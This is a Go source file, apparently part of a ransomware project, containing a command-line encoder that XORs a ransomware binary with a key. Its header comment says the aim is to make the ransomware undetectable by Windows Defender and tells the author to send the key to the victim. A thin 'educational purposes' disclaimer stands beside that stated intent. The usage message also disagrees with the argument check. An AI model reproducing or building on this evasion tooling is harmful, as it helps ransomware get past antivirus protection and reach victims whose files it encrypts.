/*
	Author: Alcid3s

	This encoder is made to xor the ransomware with a given string. This string can be anything.
	However the same string must be used to deobfuscate and execute the ransomware. Therefore it is advised
	to send the string to the victim in a secure way. The obfuscated ransomware is undetectable for windows defender.
	However as soon as the ransomware is deobfuscated it shall be detected by windows defender.

	This is made for educational / research purposes only. The creator isn't not responsible for any damage caused by this software.
*/

package main

import (
	"fmt"
	"os"

	"ransomware.com/main/internal/obfuscator"
)

func main() {
	if len(os.Args) != 4 {
		fmt.Fprintf(os.Stderr, "Usage: %s <input file> <key>\n", os.Args[0])
		os.Exit(1)
	}

	inputFilename := os.Args[1]
	key := os.Args[2]
	outputFilename := os.Args[3]

	keyBytes := []byte(key)

	obfuscator.XorFile(inputFilename, keyBytes, outputFilename)
}
